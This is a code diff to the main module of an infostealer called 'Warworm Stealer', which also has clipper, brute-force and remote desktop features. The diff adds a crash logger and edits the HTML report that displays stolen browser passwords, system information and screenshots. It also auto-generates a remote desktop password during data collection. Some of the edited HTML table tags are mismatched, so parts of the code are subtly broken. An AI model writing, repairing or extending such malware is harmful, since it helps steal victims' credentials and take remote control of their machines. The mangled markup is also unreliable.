@@ -7,8 +7,27 @@ Warworm Stealer Main Module v1.3.0
 - Brute force: auto brute with preview and HTML report
 """
 
-import os
 import sys
+import os
+import traceback
+from datetime import datetime
+
+# --- Global exception handler for debug (writes to %TEMP%\warworm_crash.log) ---
+def _global_exception_handler(exc_type, exc_value, exc_tb):
+    try:
+        log_dir = os.environ.get('TEMP', os.getcwd())
+        log_file = os.path.join(log_dir, 'warworm_crash.log')
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(f"\n{'='*60}\n")
+            f.write(f"CRASH at {datetime.now()}\n")
+            f.write(f"Exception: {exc_type.__name__}: {exc_value}\n")
+            traceback.print_tb(exc_tb, file=f)
+            f.write(f"{'='*60}\n")
+    except:
+        pass
+
+sys.excepthook = _global_exception_handler
+
 import json
 import zipfile
 import tempfile
@@ -21,10 +40,7 @@ import ipaddress
 import threading
 import platform
 import psutil
-import traceback 
 # from html import escape as html_escape
-
-from datetime import datetime
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))
 
@@ -1276,9 +1292,9 @@ def generate_html_report(output_dir, clipper_running=False):
 
     # System Info
     if has_system:
-        sys_rows = ''.join([f"<tr><td>{line.split(':', 1)[0].strip()}</td><td>{line.split(':', 1)[1].strip() if ':' in line else ''}</td></tr>" 
+        sys_rows = ''.join([f"<tr><td>{line.split(':', 1)[0].strip()}</td><td>{line.split(':', 1)[1].strip() if ':' in line else ''}</td></table>" 
                           for line in sys_data["raw_lines"] if ':' in line])
-        sections_html.append(f'''<div class="section" id="system-section" style="display: none;"><h2>💻 System Information <span class="file-badge">system_infos.txt</span></h2><table><tr><th>Property</th><th>Value</th></tr>{sys_rows}</table></div>''')
+        sections_html.append(f'''<div class="section" id="system-section" style="display: none;"><h2>💻 System Information <span class="file-badge">system_infos.txt</span></h2><tr><tr><th>Property</th><th>Value</th></tr>{sys_rows}</table></div>''')
 
     # Screenshot
     if has_screenshot:
@@ -1350,7 +1366,7 @@ def generate_html_report(output_dir, clipper_running=False):
         <script>
             (function(){
                 var pwdData = JSON.parse(atob('""" + pwd_b64 + """'));
-                var html = ['<table><tr><th>Browser</th><th>URL</th><th>Username</th><th>Password</th></tr>'];
+                var html = ['</table><tr><th>Browser</th><th>URL</th><th>Username</th><th>Password</th></tr>'];
                 
                 for (var i = 0; i < pwdData.length; i++) {
                     var p = pwdData[i];
@@ -1819,6 +1835,11 @@ def run_data_collection():
     os.makedirs(output_dir, exist_ok=True)
 
     print(f"[*] Output directory: {output_dir}")
+
+    # ----- FIX: ensure remote_desktop_password exists -----
+    if not CONFIG.get('remote_desktop_password'):
+        CONFIG['remote_desktop_password'] = generate_secure_password()
+        print(f"[+] Auto-generated remote_desktop_password: {CONFIG['remote_desktop_password']}")
 
     results = {
         "collection_time": datetime.now().isoformat(),
